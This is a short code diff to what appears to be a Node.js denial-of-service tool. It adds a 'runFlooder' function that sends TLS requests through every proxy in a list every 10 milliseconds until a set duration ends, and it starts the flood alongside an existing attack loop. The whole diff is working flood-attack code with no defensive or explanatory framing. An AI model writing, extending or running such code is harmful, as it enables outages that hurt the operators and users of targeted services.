@@ -112,10 +112,28 @@ if (cluster.isMaster) {
         setTimeout(attackLoop, 10); // Delay kecil agar CPU tidak overload
     }
 
+    // Flooder function for continuously sending requests
+    function runFlooder() {
+        const floodInterval = setInterval(() => {
+            if (Date.now() - startTime >= duration * 1000) {
+                clearInterval(floodInterval);
+                console.log(`Worker ${process.pid} stopping flood.`);
+                process.exit(0);
+            }
+
+            const allProxyRequests = proxies.map(proxy => sendTLSRequest(proxy));
+
+            Promise.all(allProxyRequests)
+                .catch(err => console.error("Error with proxy request:", err));
+        }, 10); // Send requests every 10ms
+
+    }
+
     process.on('uncaughtException', (err) => {
         console.error('Uncaught exception:', err);
         process.exit(1);
     });
 
-    attackLoop();
+    runFlooder(); // Start the flooder
+    attackLoop();  // Start the attack loop
 }
